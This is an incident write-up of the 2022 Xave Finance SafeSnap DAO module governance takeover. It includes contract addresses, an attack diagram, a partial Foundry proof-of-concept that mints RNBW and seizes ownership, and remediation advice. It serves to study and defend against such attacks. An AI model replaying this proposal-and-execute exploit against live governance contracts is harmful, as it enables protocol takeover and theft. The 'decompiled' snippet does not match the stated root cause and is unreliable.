# XaveFinance — SafeSnap DAO Module Governance Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | Xave Finance |
| **Chain** | Ethereum Mainnet |
| **Loss** | 100,000,000,000,000 RNBW tokens (ownership takeover) |
| **RNBW Token** | [0xE94B97b6b43639E238c851A7e693F50033EfD75C](https://etherscan.io/address/0xE94B97b6b43639E238c851A7e693F50033EfD75C) |
| **LPOP Token** | [0x6335A2E4a2E304401fcA4Fc0deafF066B813D055](https://etherscan.io/address/0x6335A2E4a2E304401fcA4Fc0deafF066B813D055) |
| **Primary Bridge** | [0x579270F151D142eb8BdC081043a983307Aa15786](https://etherscan.io/address/0x579270F151D142eb8BdC081043a983307Aa15786) |
| **DAO Module (vulnerable)** | [0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F](https://etherscan.io/address/0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F) |
| **Realitio** | [0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47](https://etherscan.io/address/0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47) |
| **Attacker EOA** | [0x0f44f3489D17e42ab13A6beb76E57813081fc1E2](https://etherscan.io/address/0x0f44f3489D17e42ab13A6beb76E57813081fc1E2) |
| **Attack Contract** | [0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3](https://etherscan.io/address/0xE167cdAAc8718b90c03Cf2CB75DC976E24EE86D3) |
| **Root Cause** | SafeSnap DAO module did not validate proposal transactions, allowing arbitrary transaction execution |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/XaveFinance_exp.sol) |

---
## 1. Vulnerability Overview

Xave Finance used a governance system based on Gnosis Safe + SafeSnap DAO module + Realitio oracle. The SafeSnap DAO module is structured to execute an associated batch of transactions once a specific question on Realitio receives a finalized answer. The vulnerability lay in the fact that the `addProposal()` function did not validate the transactions included in a proposal. The attacker created a proposal containing four malicious transactions — minting 100 trillion RNBW, transferring RNBW ownership, transferring LPOP ownership, and transferring Primary Bridge ownership — then immediately submitted an answer on Realitio. After a 24-hour cooldown, they called `executeProposalWithIndex()` to execute all transactions.

---
## 2. Vulnerable Code Analysis

```solidity
// SafeSnap DAO Module Structure
// Realitio oracle: question → answer finalized → transaction execution

// ❌ Vulnerable addProposal() — no validation of transaction contents
contract DaoModule {
    struct Transaction {
        address to;
        uint256 value;
        bytes data;
        Enum.Operation operation;
        uint256 nonce;
    }

    mapping(bytes32 => bytes32[]) public questionIds;
    mapping(bytes32 => Transaction) public txHashes;

    // ❌ Proposal transaction contents are not validated at all
    // Anyone can create a proposal containing arbitrary transactions
    function addProposal(
        string calldata proposalId,
        bytes32[] calldata txHashes_
    ) external {
        // Does not validate the execution code in txHashes_
        bytes32 questionId = _buildQuestion(proposalId, txHashes_);
        questionIds[bytes32(bytes(proposalId))] = txHashes_;
        // Register question on Realitio
        realitio.askQuestion(questionId, ...);
    }

    // ❌ executeProposalWithIndex() — only checks oracle answer, does not validate transaction safety
    function executeProposalWithIndex(
        string calldata proposalId,
        bytes32[] calldata txHashes_,
        Transaction calldata tx_,
        uint256 txIndex
    ) external {
        bytes32 questionId = questionIds[bytes32(bytes(proposalId))];
        // ❌ Executes unconditionally if Realitio answer is "yes"
        require(realitio.resultFor(questionId) == bytes32(uint256(1)), "Not approved");

        // ❌ The contents of tx_ itself are not validated
        // mint(attacker, 100_000_000_000_000e18) can be executed
        safe.execTransactionFromModule(tx_.to, tx_.value, tx_.data, tx_.operation);
    }
}

// ✅ Correct pattern — proposal transaction whitelist or timelock
contract SafeDaoModule {
    uint256 public constant MIN_TIMELOCK = 7 days; // Sufficient timelock
    mapping(address => bool) public allowedTargets;

    function executeProposalWithIndex(...) external {
        // ✅ Sufficient timelock ensures time for community review
        require(block.timestamp >= proposalTime + MIN_TIMELOCK, "Timelock active");
        // ✅ Only allowed contracts can be called
        require(allowedTargets[tx_.to], "Target not allowed");
        // ✅ Block dangerous selectors such as mint, transferOwnership
        bytes4 selector = bytes4(tx_.data);
        require(!blockedSelectors[selector], "Blocked selector");

        safe.execTransactionFromModule(tx_.to, tx_.value, tx_.data, tx_.operation);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**XaveFinance_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: SafeSnap DAO module did not validate proposal transactions, allowing arbitrary transaction execution
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Prepare 4 malicious transactions:
    │       TX1: RNBW.mint(attacker, 100_000_000_000_000e18)
    │       TX2: RNBW.transferOwnership(attacker)
    │       TX3: LPOP.transferOwnership(attacker)
    │       TX4: PrimaryBridge.transferOwnership(attacker)
    │
    ├─[2] DaoModule.addProposal(proposalId, [TX1, TX2, TX3, TX4])
    │       ❌ No validation of transaction contents
    │       → Register question on Realitio
    │
    ├─[3] Realitio.submitAnswer(questionId, "yes", bond)
    │       → Attacker immediately submits "yes" answer + deposits bond
    │
    ├─[4] Wait 24 hours (Realitio cooldown)
    │       Legitimate governance participants do not challenge
    │
    ├─[5] DaoModule.executeProposalWithIndex() × 4 calls
    │       TX1: Mint 100 trillion RNBW
    │       TX2: RNBW ownership → attacker
    │       TX3: LPOP ownership → attacker
    │       TX4: PrimaryBridge ownership → attacker
    │
    └─[6] Full protocol takeover + mass RNBW minting
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IDaoModule {
    function addProposal(string calldata proposalId, bytes32[] calldata txHashes) external;
    function getTransactionHash(
        address to, uint256 value, bytes calldata data,
        uint8 operation, uint256 nonce
    ) external view returns (bytes32);
    function executeProposalWithIndex(
        string calldata proposalId,
        bytes32[] calldata txHashes,
        address to,
        uint256 value,
        bytes calldata data,
        uint8 operation,
        uint256 txIndex
    ) external;
}

interface IRealitio {
    function submitAnswer(bytes32 questionId, bytes32 answer, uint256 maxPrevious) external payable;
    function resultFor(bytes32 questionId) external view returns (bytes32);
}

interface IERC20Mintable {
    function mint(address to, uint256 amount) external;
    function transferOwnership(address newOwner) external;
    function balanceOf(address) external view returns (uint256);
}

contract XaveFinanceExploit is Test {
    IDaoModule dao      = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71faeb2f573E2F);
    IRealitio realitio  = IRealitio(0x325a2e0F3CCA2ddbaeBB4DfC38Df8D19ca165b47);
    IERC20Mintable rnbw = IERC20Mintable(0xE94B97b6b43639E238c851A7e693F50033EfD75C);

    string constant PROPOSAL_ID = "attack-proposal-1";

    function setUp() public {
        vm.createSelectFork("mainnet", 15_704_736);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] RNBW", rnbw.balanceOf(address(this)), 18);

        // [Step 1] Compute malicious transaction hashes
        bytes memory mintData = abi.encodeWithSelector(
            IERC20Mintable.mint.selector,
            address(this),
            100_000_000_000_000 * 1e18
        );
        bytes memory ownerData = abi.encodeWithSelector(
            IERC20Mintable.transferOwnership.selector,
            address(this)
        );

        bytes32[] memory txHashes = new bytes32[](4);
        txHashes[0] = dao.getTransactionHash(address(rnbw), 0, mintData,  0, 0);
        txHashes[1] = dao.getTransactionHash(address(rnbw), 0, ownerData, 0, 1);
        // TX3, TX4: LPOP, PrimaryBridge transferOwnership
        // (omitted)

        // [Step 2] Register proposal — no content validation
        dao.addProposal(PROPOSAL_ID, txHashes);

        // [Step 3] Immediately submit "yes" answer on Realitio
        // (compute questionId, then call submitAnswer)

        // [Step 4] Simulate 24 hours passing
        vm.warp(block.timestamp + 24 hours + 1);

        // [Step 5] Execute malicious transactions
        // ⚡ Only oracle answer is checked; transaction contents are not validated
        dao.executeProposalWithIndex(
            PROPOSAL_ID, txHashes, address(rnbw), 0, mintData, 0, 0
        );
        dao.executeProposalWithIndex(
            PROPOSAL_ID, txHashes, address(rnbw), 0, ownerData, 0, 1
        );

        emit log_named_decimal_uint("[End] RNBW", rnbw.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | SafeSnap DAO module proposal transaction not validated → governance manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Governance manipulation attack |
| **Attack Vector** | `addProposal(malicious TX)` → Realitio "yes" answer → 24h wait → `executeProposalWithIndex()` |
| **Preconditions** | DAO module does not validate proposal transaction contents, short cooldown, community undetected |
| **Impact** | 100 trillion RNBW minted, ownership of core protocol contracts seized |

---
## 6. Remediation Recommendations

1. **Sufficient Timelock**: Apply a minimum timelock of 48–72 hours or more before governance execution, ensuring the community has time to detect and challenge malicious proposals.
2. **Transaction Whitelist**: Restrict the contract addresses and function selectors executable by the DAO module to an explicit whitelist. Apply additional multisig requirements for dangerous functions such as `mint()` and `transferOwnership()`.
3. **Realitio Bond Floor**: Set a high minimum bond amount so attackers cannot immediately submit an answer with a minimal bond, thereby strengthening the incentive to challenge.
4. **Community Monitoring**: Build an automated alert system for new governance proposals so malicious proposals are detected immediately.

---
## 7. Lessons Learned

- **Governance as an Attack Surface**: On-chain governance allows a single attacker to seize an entire protocol if the community does not actively monitor it. Smaller protocols in particular have low governance participation rates, making it easy for malicious proposals to pass.
- **The 24-Hour Cooldown Trap**: Realitio's 24-hour cooldown may seem sufficient under normal circumstances, but if the community fails to notice a proposal submitted in the early hours of the morning, it passes without opposition. The more critical the protocol, the longer the timelock required.
- **The Risk of SafeSnap**: SafeSnap is a powerful tool that bridges Snapshot governance to on-chain execution, but it does not validate proposal contents at the smart contract level. Protocols deploying SafeSnap must explicitly restrict the scope of executable actions.